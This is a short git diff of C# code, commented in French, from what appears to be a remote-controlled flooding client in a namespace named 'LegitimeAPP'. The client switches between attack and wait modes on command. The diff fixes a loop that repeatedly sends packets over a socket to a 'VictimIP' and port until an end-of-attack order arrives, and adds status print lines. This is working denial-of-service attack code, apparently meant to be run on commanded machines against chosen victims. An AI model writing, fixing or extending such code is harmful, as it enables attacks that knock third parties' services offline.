@@ -51,10 +51,14 @@ namespace LegitimeAPP.Shared
 
 
         public void OnNewAttackOrder() {
-            _attackInProgress = true ; 
+
+            Console.WriteLine("Le client passe en mode attaque") ;
+            _attackInProgress = true ;
             NewAttackOrder?.Invoke();
         } 
         public void OnEndAttackOrder() {
+
+            Console.WriteLine("Le client passe en attente ") ; 
             _attackInProgress = false ; 
             EndAttackOrder?.Invoke();
         }
@@ -179,15 +183,19 @@ namespace LegitimeAPP.Shared
             IPEndPoint ep = new(IPAddress.Parse(this.VictimIP), this.Port);
 
 
-            while (!_attackInProgress)
+            while (true)
             {
 
-                // Console.WriteLine("On attaque ! ") ; 
+                Console.WriteLine("On attaque ! ") ; 
 
                 target.SendTo(data, ep);
 
                 // attente avant chaque envoie 
                 Thread.Sleep(this.speed);
+
+                if ( !_attackInProgress ) {
+                    break ; 
+                }
             }
 
             Console.WriteLine("On passe par là ") ; 
